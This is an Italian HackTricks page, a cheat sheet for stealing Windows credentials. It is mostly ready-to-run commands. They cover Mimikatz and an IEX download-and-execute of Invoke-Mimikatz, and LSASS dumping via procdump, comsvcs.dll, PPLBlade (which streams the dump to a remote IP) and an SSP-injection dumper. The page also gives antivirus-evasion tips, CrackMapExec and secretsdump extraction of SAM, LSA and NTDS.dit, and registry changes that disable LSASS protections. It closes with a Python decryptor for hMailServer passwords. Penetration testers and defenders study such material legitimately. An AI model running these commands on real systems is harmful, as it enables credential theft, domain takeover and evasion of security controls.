# Rubare le credenziali di Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trova altre cose che Mimikatz può fare in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credenziali con Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare passwords e hashes** all'interno della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypass degli AV

### Procdump + Mimikatz

Poiché **Procdump da** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è uno strumento Microsoft legittimo**, non viene rilevato da Defender.\
Puoi usare questo strumento per **dump the lsass process**, **download the dump** e **estrarre** le **credentials localmente** dal dump.

Puoi anche usare [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alcuni **AV** potrebbero **detect** come **malicious** l'uso di **procdump.exe to dump lsass.exe**, questo perché stanno **detecting** la stringa **"procdump.exe" and "lsass.exe"**. Quindi è più **stealthier** **pass** come **argument** il **PID** di lsass.exe a procdump **instead of** il **name lsass.exe.**

### Dumping lsass with **comsvcs.dll**

Una DLL chiamata **comsvcs.dll** presente in `C:\Windows\System32` è responsabile per il **dumping process memory** in caso di crash. Questa DLL include una **function** chiamata **`MiniDumpW`**, progettata per essere invocata usando `rundll32.exe`.\
Non è rilevante usare i primi due argomenti, ma il terzo è diviso in tre componenti. L'ID del processo da dumpare costituisce la prima componente, la posizione del file di dump rappresenta la seconda, e la terza componente è strettamente la parola **full**. Non esistono opzioni alternative.\
Dopo aver parsato queste tre componenti, la DLL si occupa di creare il file di dump e trasferire in esso la memoria del processo specificato.\
L'utilizzo della **comsvcs.dll** è fattibile per il dumping del processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio su [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il seguente comando viene utilizzato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass con Task Manager**

1. Fai clic con il tasto destro sulla Task Bar e seleziona Task Manager
2. Clicca su More details
3. Cerca il processo "Local Security Authority Process" nella scheda Processes
4. Fai clic con il tasto destro sul processo "Local Security Authority Process" e clicca su "Create dump file".

### Dumping lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario firmato Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping di lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è un Protected Process Dumper Tool che supporta l'offuscamento dei memory dump e il trasferimento verso remote workstations senza salvarli su disco.

**Funzionalità chiave**:

1. Bypass della protezione PPL
2. Offuscamento dei memory dump per eludere i meccanismi di rilevamento basati su firma di Defender
3. Caricamento dei memory dump usando i metodi di upload RAW e SMB senza salvarli su disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dump di LSASS basato su SSP senza MiniDumpWriteDump

Ink Dragon fornisce un dumper in tre fasi chiamato **LalsDumper** che non invoca mai `MiniDumpWriteDump`, quindi gli hook EDR su quella API non si attivano:

1. **Stage 1 loader (`lals.exe`)** – cerca in `fdp.dll` un placeholder costituito da 32 caratteri `d` minuscoli, lo sovrascrive con il path assoluto di `rtu.txt`, salva la DLL patchata come `nfdp.dll` e chiama `AddSecurityPackageA("nfdp","fdp")`. Questo forza **LSASS** a caricare la DLL malevola come nuovo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quando LSASS carica `nfdp.dll`, la DLL legge `rtu.txt`, XORa ogni byte con `0x20` e mappa il blob decodificato in memoria prima di trasferire l'esecuzione.
3. **Stage 3 dumper** – il payload mappato re-implementa la logica di MiniDump usando syscalls diretti risolti da nomi API hashati (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Una export dedicata chiamata `Tom` apre `%TEMP%\<pid>.ddt`, scrive in streaming un dump compresso di LSASS nel file e chiude l'handle così l'esfiltrazione può avvenire in seguito.

Note per l'operatore:

* Tieni `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` nella stessa directory. Stage 1 riscrive il placeholder hard-coded con il path assoluto di `rtu.txt`, quindi separarli rompe la catena.
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi impostare quel valore manualmente per far sì che LSASS ricarichi l'SSP a ogni avvio.
* I file `%TEMP%\*.ddt` sono dump compressi. Decomprimili localmente, poi passali a Mimikatz/Volatility per l'estrazione delle credenziali.
* Eseguire `lals.exe` richiede diritti admin/SeTcb affinché `AddSecurityPackageA` abbia successo; una volta che la chiamata ritorna, LSASS carica in maniera trasparente l'SSP malevolo ed esegue Stage 2.
* Rimuovere la DLL dal disco non la rimuove da LSASS. O elimina la voce di registro e riavvia LSASS (reboot), oppure lasciala per persistenza a lungo termine.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Eseguire il dump dei segreti LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Eseguire il dump di NTDS.dit dal target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump la cronologia delle password di NTDS.dit dal target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Rubare SAM & SYSTEM

Questi file dovrebbero essere **posizionati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in modo normale** perché sono protetti.

### Dal registro

Il modo più semplice per rubare questi file è ottenere una copia dal registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali e **estrai gli hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

È possibile copiare file protetti usando questo servizio. È necessario essere Administrator.

#### Utilizzo di vssadmin

Il binario vssadmin è disponibile solo nelle versioni di Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso con **Powershell**. Questo è un esempio di **come copiare il file SAM** (l'hard drive usato è "C:" e viene salvato in C:\users\Public), ma puoi usare questo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Codice dal libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Infine, puoi anche usare lo [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per creare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenziali di Active Directory - NTDS.dit**

Il file **NTDS.dit** è considerato il cuore di **Active Directory**, contenendo dati critici sugli oggetti utente, i gruppi e le loro appartenenze. È il luogo in cui sono memorizzati i **password hashes** per gli utenti di dominio. Questo file è un database **Extensible Storage Engine (ESE)** e risiede in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database sono mantenute tre tabelle principali:

- **Data Table**: Questa tabella si occupa di memorizzare i dettagli sugli oggetti come utenti e gruppi.
- **Link Table**: Tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **SD Table**: **Security descriptors** per ogni oggetto sono qui conservati, garantendo la sicurezza e il controllo di accesso per gli oggetti memorizzati.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decriptazione degli hash all'interno di NTDS.dit

L'hash è cifrato 3 volte:

1. Decrittare il Password Encryption Key (**PEK**) usando il **BOOTKEY** e **RC4**.
2. Decrittare l'**hash** usando **PEK** e **RC4**.
3. Decrittare l'**hash** usando **DES**.

**PEK** ha lo **stesso valore** in **ogni domain controller**, ma è **cifrato** all'interno del file **NTDS.dit** usando il **BOOTKEY** del file **SYSTEM del domain controller (diverso tra domain controller)**. Per questo, per ottenere le credenziali dal file NTDS.dit **è necessario avere i file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copia di NTDS.dit usando Ntdsutil

Disponibile da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Puoi anche usare il [**volume shadow copy**](#stealing-sam-and-system) trucco per copiare il file **ntds.dit**. Ricorda che ti servirà anche una copia del file **SYSTEM** (di nuovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trucco).

### **Estrazione degli hash da NTDS.dit**

Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM** puoi usare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** usando un utente domain admin valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per **file NTDS.dit di grandi dimensioni** è consigliabile estrarlo usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche usare il **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non vengono estratti solo i segreti, ma anche gli oggetti completi e i loro attributi per ulteriori estrazioni di informazioni quando il raw NTDS.dit è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La hive `SYSTEM` è opzionale ma consente la decrittazione dei segreti (NT & LM hashes, supplemental credentials come cleartext passwords, kerberos o trust keys, NT & LM password histories). Insieme ad altre informazioni, vengono estratti i seguenti dati : account utente e macchina con i loro hash, UAC flags, timestamp dell'ultimo logon e del cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenza, trusted domains con trusts type, direction e attributes...

## Lazagne

Scarica il binary da [here](https://github.com/AlessandroZ/LaZagne/releases). puoi usare questo binary per estrarre credentials da diversi software.
```
lazagne.exe all
```
## Altri strumenti per estrarre credentials da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere usato per estrarre credentials dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrae credentials dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai credentials dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e semplicemente **eseguilo** e le password verranno estratte.

## Rilevamento di sessioni RDP inattive e indebolimento dei controlli di sicurezza

Ink Dragon’s FinalDraft RAT include un tasker `DumpRDPHistory` le cui tecniche sono utili per qualsiasi red-teamer:

### Raccolta telemetria in stile DumpRDPHistory

* **Outbound RDP targets** – analizza ogni user hive in `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Ogni sottochiave memorizza il nome del server, `UsernameHint`, e la timestamp dell'ultima scrittura. Puoi replicare la logica di FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – interroga il log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli Event ID **21** (accesso riuscito) e **25** (disconnessione) per mappare chi ha amministrato la macchina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una volta identificato quale Domain Admin si connette regolarmente, dumpa LSASS (con LalsDumper/Mimikatz) mentre la loro sessione **disconnessa** è ancora presente. CredSSP + NTLM fallback lascia il loro verifier e i token in LSASS, che possono poi essere replayati tramite SMB/WinRM per ottenere `NTDS.dit` o impiantare persistenza sui domain controllers.

### Registry downgrades targeted by FinalDraft

Lo stesso implant manipola anche diverse chiavi di registro per rendere più semplice il furto di credenziali:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Impostazione `DisableRestrictedAdmin=1` forza il riutilizzo completo di credenziali/ticket durante RDP, abilitando pivot in stile pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` disabilita il filtraggio dei token UAC in modo che gli amministratori locali ottengano token senza restrizioni sulla rete.
* `DSRMAdminLogonBehavior=2` consente all'amministratore DSRM di accedere mentre il DC è online, fornendo agli attaccanti un altro account integrato con privilegi elevati.
* `RunAsPPL=0` rimuove le protezioni PPL di LSASS, rendendo l'accesso alla memoria semplice per dumper come LalsDumper.

## Credenziali del database di hMailServer (post-compromise)

hMailServer memorizza la password del DB in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` sotto `[Database] Password=`. Il valore è criptato con Blowfish usando la chiave statica `THIS_KEY_IS_NOT_SECRET` e scambi di endianness su parole da 4 byte. Usa la stringa esadecimale dall'INI con questo snippet Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Con la password in chiaro, copia il database SQL CE per evitare i blocchi dei file, carica il provider a 32 bit e aggiorna se necessario prima di interrogare gli hash:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La colonna `accountpassword` usa il formato hash di hMailServer (hashcat mode `1421`). Il cracking di questi valori può fornire credenziali riutilizzabili per pivot WinRM/SSH.
## Riferimenti

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
